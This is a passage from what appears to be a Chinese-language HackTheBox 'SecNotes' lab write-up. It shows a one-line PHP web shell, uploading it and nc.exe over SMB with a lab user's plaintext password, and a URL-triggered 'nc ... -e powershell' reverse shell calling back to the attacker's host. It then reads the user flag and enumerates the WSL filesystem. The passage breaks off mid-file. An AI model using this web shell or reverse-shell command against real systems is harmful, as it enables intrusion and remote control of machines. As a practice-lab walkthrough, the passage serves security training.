+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ echo <span class="hljs-string">&#x27;&lt;?php system($_REQUEST[&#x27;</span>cmd<span class="hljs-number">&#x27;</span>]); ?&gt;<span class="hljs-string">&#x27; &gt; shell.php </span><br><span class="hljs-string"></span><br><span class="hljs-string">┌──(kali㉿offsec)-[~/Desktop]</span><br><span class="hljs-string">└─$ smbclient \\\\10.10.10.97\\new-site -U tyler%&#x27;</span><span class="hljs-number">92</span>g!mA8BGjOirkL%OG*&amp;&#x27;<br>Try <span class="hljs-string">&quot;help&quot;</span> to get a <span class="hljs-built_in">list</span> of possible commands.<br>smb: \&gt; put nc.exe <br>putting file nc.exe as \nc.exe (<span class="hljs-number">13.9</span> kb/s) (average <span class="hljs-number">13.9</span> kb/s)<br>smb: \&gt; put shell.php <br>putting file shell.php as \shell.php (<span class="hljs-number">0.0</span> kb/s) (average <span class="hljs-number">11.1</span> kb/s)<br>smb: \&gt; <br></code></pre></td></tr></table></figure>
+
+<p>16、获取初始反弹shell</p>
+<p><code>http://10.10.10.97:8808/shell.php?cmd=nc%2010.10.14.11%20443%20-e%20powershell</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kali㉿offsec)-[~/Desktop]<br>└─$ nc -lvnp <span class="hljs-number">443</span><br>listening on [any] <span class="hljs-number">443</span> ...<br>connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.11</span>] from (UNKNOWN) [<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.97</span>] <span class="hljs-number">50231</span><br>Windows PowerShell <br><span class="hljs-title function_">Copyright</span> <span class="hljs-params">(C)</span> Microsoft Corporation. All rights reserved.<br><br>PS C:\inetpub\new-site&gt; whoami<br>whoami<br>secnotes\tyler<br>PS C:\inetpub\new-site&gt; <br></code></pre></td></tr></table></figure>
+
+<p>17、这里发现我个人WEBshell反弹的各种PHP代码都是显示的500，最后按照演练报告里的提示，才算是执行了，可能是PHP版本过低吧</p>
+<p><img src="http://sh1yan.top/photo/SecNotes-htb-writeup/13.png" srcset="/img/loading.gif" lazyload></p>
+<p>18、获取下初始的flag信息吧</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\inetpub\new-site&gt; cd C:/Users/tyler/Desktop<br>cd C:/Users/tyler/Desktop<br>PS C:\Users\tyler\Desktop&gt; dir<br>dir<br><br><br>    Directory: C:\Users\tyler\Desktop<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>-a----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">09</span> AM           <span class="hljs-number">1293</span> bash.lnk                                                              <br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">4</span>:<span class="hljs-number">34</span> PM           <span class="hljs-number">1142</span> Command Prompt.lnk                                                    <br>-a----        <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">4</span>:<span class="hljs-number">34</span> PM            <span class="hljs-number">407</span> File Explorer.lnk                                                     <br>-a----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">5</span>:<span class="hljs-number">50</span> PM           <span class="hljs-number">1417</span> Microsoft Edge.lnk                                                    <br>-a----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">9</span>:<span class="hljs-number">17</span> AM           <span class="hljs-number">1110</span> Notepad++.lnk                                                         <br>-ar---        <span class="hljs-number">3</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2024</span>   <span class="hljs-number">8</span>:<span class="hljs-number">12</span> AM             <span class="hljs-number">34</span> user.txt                                                              <br>-a----        <span class="hljs-number">8</span>/<span class="hljs-number">19</span>/<span class="hljs-number">2018</span>  <span class="hljs-number">10</span>:<span class="hljs-number">59</span> AM           <span class="hljs-number">2494</span> Windows PowerShell.lnk                                                <br><br><br>PS C:\Users\tyler\Desktop&gt; type user.txt<br>type user.txt<br>b44851b46b79be37875db549ca66<br></code></pre></td></tr></table></figure>
+
+<h4 id="0x02-系统权限获取"><a href="#0x02-系统权限获取" class="headerlink" title="0x02 系统权限获取"></a>0x02 系统权限获取</h4><p>19、在目录枚举中发现了Ubuntu.zip文件，疑似存在wsl子系统</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Users\tyler\Desktop&gt; cd C:/<br>cd C:/<br>PS C:\&gt; dir<br>dir<br><br><br>    Directory: C:\<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">07</span> PM                Distros                                                               <br>d-----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">47</span> PM                inetpub                                                               <br>d-----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">09</span> PM                Microsoft                                                             <br>d-----        <span class="hljs-number">4</span>/<span class="hljs-number">11</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">4</span>:<span class="hljs-number">38</span> PM                PerfLogs                                                              <br>d-----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">8</span>:<span class="hljs-number">15</span> AM                php7                                                                  <br>d-r---        <span class="hljs-number">1</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">39</span> AM                Program Files                                                         <br>d-r---        <span class="hljs-number">1</span>/<span class="hljs-number">26</span>/<span class="hljs-number">2021</span>   <span class="hljs-number">2</span>:<span class="hljs-number">38</span> AM                Program <span class="hljs-title function_">Files</span> <span class="hljs-params">(x86)</span>                                                   <br>d-r---        6/21/2018   3:00 PM                Users                                                                 <br>d-----        1/26/2021   2:38 AM                Windows                                                               <br>-a----        6/21/2018   3:07 PM      201749452 Ubuntu.zip                                                            <br><br><br>PS C:\&gt; <br><br><br>PS C:\&gt; cd Distros<br>cd Distros<br>PS C:\Distros&gt; dir<br>dir<br><br><br>    Directory: C:\Distros<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        6/21/2018   5:59 PM                Ubuntu                                                                <br><br><br>PS C:\Distros&gt; cd Ubuntu<br>cd Ubuntu<br>PS C:\Distros\Ubuntu&gt; dir<br>dir<br><br><br>    Directory: C:\Distros\Ubuntu<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----        6/21/2018   3:07 PM                AppxMetadata                                                          <br>d-----        6/21/2018   3:07 PM                Assets                                                                <br>d-----        6/21/2018   3:07 PM                images                                                                <br>d-----        6/21/2018   5:51 PM                temp                                                                  <br>-a----        7/11/2017   6:10 PM         190434 AppxBlockMap.xml                                                      <br>-a----        7/11/2017   6:10 PM           2475 AppxManifest.xml                                                      <br>-a----        7/11/2017   6:11 PM          10554 AppxSignature.p7x                                                     <br>-a----        7/11/2017   6:10 PM      201254783 install.tar.gz                                                        <br>-a----        7/11/2017   6:10 PM           4840 resources.pri                                                         <br>-a----        7/11/2017   6:10 PM         222208 ubuntu.exe                                                            <br>-a----        7/11/2017   6:10 PM            809 [Content_Types].xml                                                   <br><br><br>PS C:\Distros\Ubuntu&gt; <br></code></pre></td></tr></table></figure>
+
+<p>20、检查是否安装WSL子系统</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Distros\Ubuntu&gt; Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %&#123;Get-ItemProperty $_.PSPath&#125; | out-<span class="hljs-built_in">string</span> -width <span class="hljs-number">4096</span><br>Get-ChildItem HKCU:\Software\Microsoft\Windows\CurrentVersion\Lxss | %&#123;Get-ItemProperty $_.PSPath&#125; | out-<span class="hljs-built_in">string</span> -width <span class="hljs-number">4096</span><br><br><br>State             : <span class="hljs-number">1</span><br>DistributionName  : Ubuntu<span class="hljs-number">-18.04</span><br>Version           : <span class="hljs-number">1</span><br>BasePath          : C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState<br>PackageFamilyName : CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc<br>PSPath            : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss\&#123;<span class="hljs-number">02893575</span><span class="hljs-number">-609</span>c<span class="hljs-number">-4e3</span>b-a426<span class="hljs-number">-00f</span>9d9b271da&#125;<br>PSParentPath      : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Lxss<br>PSChildName       : &#123;<span class="hljs-number">02893575</span><span class="hljs-number">-609</span>c<span class="hljs-number">-4e3</span>b-a426<span class="hljs-number">-00f</span>9d9b271da&#125;<br>PSProvider        : Microsoft.PowerShell.Core\Registry<br></code></pre></td></tr></table></figure>
+
+<p>21、通过不断翻阅子系统里的内部文件，来查找敏感信息</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><code class="hljs c">PS C:\Distros\Ubuntu&gt; <br><br>ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState<br><br>PS C:\Distros\Ubuntu&gt; ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState<br>ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState<br><br><br>    Directory: <br>    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">03</span> PM                rootfs                                                                <br>d-----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">41</span> PM                temp                                                                  <br><br><br>PS C:\Distros\Ubuntu&gt; <br><br><br>ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs<br><br><br><br>PS C:\Distros\Ubuntu&gt; ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs<br>ls C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs<br><br><br>    Directory: <br>    C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">03</span> PM                bin                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                boot                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                dev                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">3</span>:<span class="hljs-number">00</span> AM                etc                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                home                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                lib                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                lib64                                                                 <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                media                                                                 <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">03</span> PM                mnt                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                opt                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                proc                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">44</span> PM                root                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                run                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">57</span> AM                sbin                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                snap                                                                  <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                srv                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">00</span> PM                sys                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">25</span> PM                tmp                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">02</span> PM                usr                                                                   <br>da----        <span class="hljs-number">6</span>/<span class="hljs-number">21</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">6</span>:<span class="hljs-number">03</span> PM                var                                                                   <br>-a----        <span class="hljs-number">6</span>/<span class="hljs-number">22</span>/<span class="hljs-number">2018</span>   <span class="hljs-number">2</span>:<span class="hljs-number">25</span> PM          <span class="hljs-number">87944</span> init                                                                  <br><br><br>PS C:\Distros\Ubuntu&gt; <br><br><br>gc C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs\root\*<br><br><br><br>PS C:\Distros\Ubuntu&gt; gc C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs\root\*<br>gc C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18<span class="hljs-number">.04</span>onWindows_79rhkp1fndgsc\LocalState\rootfs\root\*<br>gc : Access to the path <span class="hljs-string">&#x27;C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu18.04onWindows_79rhkp1fndgsc</span><br><span class="hljs-string">\LocalState\rootfs\root\filesystem&#x27;</span> is denied.<br>At line:<span class="hljs-number">1</span> <span class="hljs-type">char</span>:<span class="hljs-number">1</span><br>+ gc C:\Users\tyler\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu ...<br>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~<br>    + CategoryInfo          : PermissionDenied: (C:\Users\tyler\...root\filesystem:String) [Get-Content], Unauthorized <br>   AccessException<br>    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand<br> <br># ~/.bashrc: executed by <span class="hljs-title function_">bash</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span> <span class="hljs-keyword">for</span> non-login shells.<br><span class="hljs-meta"># see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)</span><br><span class="hljs-meta"># for examples</span><br><br># If not running interactively, don&#x27;t <span class="hljs-keyword">do</span> anything<br>[ -z &quot;$PS1&quot; ] &amp;&amp; <span class="hljs-keyword">return</span><br><br><span class="hljs-meta"># don<span class="hljs-string">&#x27;t put duplicate lines in the history. See bash(1) for more options</span></span><br><span class="hljs-string"><span class="hljs-meta"># ... or force ignoredups and ignorespace</span></span><br><span class="hljs-string"><span class="hljs-meta">HISTCONTROL=ignoredups:ignorespace</span></span><br><span class="hljs-string"><span class="hljs-meta"></span></span><br><span class="hljs-string"><span class="hljs-meta"># append to the history file, don&#x27;</span>t overwrite it</span><br>shopt -s histappend<br><br><span class="hljs-meta"># for setting history length see HISTSIZE and HISTFILESIZE in bash(1)</span><br>HISTSIZE=<span class="hljs-number">1000</span><br>HISTFILESIZE=<span class="hljs-number">2000</span><br><br><span class="hljs-meta"># check the window size after each command and, <span class="hljs-keyword">if</span> necessary,</span><br><span class="hljs-meta"># update the values of LINES and COLUMNS.</span><br>shopt -s checkwinsize<br><br><span class="hljs-meta"># make less more friendly for non-text input files, see lesspipe(1)</span><br>[ -x /usr/bin/lesspipe ] &amp;&amp; eval <span class="hljs-string">&quot;$(SHELL=/bin/sh lesspipe)&quot;</span><br><br><span class="hljs-meta"># set variable identifying the chroot you work in (used in the prompt below)</span><br><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;$debian_chroot&quot;</span> ] &amp;&amp; [ -r /etc/debian_chroot ]; then<br>    debian_chroot=$(cat /etc/debian_chroot)<br>fi<br><br><span class="hljs-meta"># set a fancy prompt (non-color, unless we know we <span class="hljs-string">&quot;want&quot;</span> color)</span><br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;$TERM&quot;</span> in<br>    xterm-color) color_prompt=yes;;<br>esac<br><br><span class="hljs-meta"># uncomment for a colored prompt, <span class="hljs-keyword">if</span> the terminal has the capability; turned</span><br><span class="hljs-meta"># off by default to not distract the user: the focus in a terminal window</span><br><span class="hljs-meta"># should be on the output of commands, not on the prompt</span><br>#force_color_prompt=yes<br><br><span class="hljs-keyword">if</span> [ -n <span class="hljs-string">&quot;$force_color_prompt&quot;</span> ]; then<br>    <span class="hljs-keyword">if</span> [ -x /usr/bin/tput ] &amp;&amp; tput setaf <span class="hljs-number">1</span> &gt;&amp;/dev/null; then<br>        # We have color support; assume it<span class="hljs-number">&#x27;</span>s compliant with Ecma<span class="hljs-number">-48</span><br>        # (ISO/IEC<span class="hljs-number">-6429</span>). (Lack of such support is extremely rare, and such<br>        <span class="hljs-meta"># a case would tend to support setf rather than setaf.)</span><br>        color_prompt=yes<br>    <span class="hljs-keyword">else</span><br>        color_prompt=<br>    fi<br>fi<br><br><span class="hljs-keyword">if</span> [ <span class="hljs-string">&quot;$color_prompt&quot;</span> = yes ]; then<br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ &#x27;</span><br><span class="hljs-keyword">else</span><br>    PS1=<span class="hljs-string">&#x27;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h:\w\$ &#x27;</span><br>fi<br>unset color_prompt force_color_prompt<br><br># If this is an xterm <span class="hljs-built_in">set</span> the title to user@host:dir<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;$TERM&quot;</span> in<br>xterm*|rxvt*)<br>    PS1=<span class="hljs-string">&quot;\[\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\u@\h: \w\a\]$PS1&quot;</span><br>    ;;<br>*)<br>    ;;<br>esac<br><br><span class="hljs-meta"># enable color support of ls and also add handy aliases</span><br><span class="hljs-keyword">if</span> [ -x /usr/bin/dircolors ]; then<br>    test -r ~/.dircolors &amp;&amp; eval <span class="hljs-string">&quot;$(dircolors -b ~/.dircolors)&quot;</span> || eval <span class="hljs-string">&quot;$(dircolors -b)&quot;</span><br>    alias ls=<span class="hljs-string">&#x27;ls --color=auto&#x27;</span><br>    <span class="hljs-meta">#alias dir=<span class="hljs-string">&#x27;dir --color=auto&#x27;</span></span><br>    <span class="hljs-meta">#alias vdir=<span class="hljs-string">&#x27;vdir --color=auto&#x27;</span></span><br><br>    alias grep=<span class="hljs-string">&#x27;grep --color=auto&#x27;</span><br>    alias fgrep=<span class="hljs-string">&#x27;fgrep --color=auto&#x27;</span><br>    alias egrep=<span class="hljs-string">&#x27;egrep --color=auto&#x27;</span><br>fi<br><br><span class="hljs-meta"># some more ls aliases</span><br>alias ll=<span class="hljs-string">&#x27;ls -alF&#x27;</span><br>alias la=<span class="hljs-string">&#x27;ls -A&#x27;</span><br>alias l=<span class="hljs-string">&#x27;ls -CF&#x27;</span><br><br># Alias definitions.<br># You may want to put all your additions into a separate file like<br># ~/.bash_aliases, instead of adding them here directly.<br># See /usr/share/doc/bash-doc/examples in the bash-doc package.<br><br><span class="hljs-keyword">if</span> [ -f 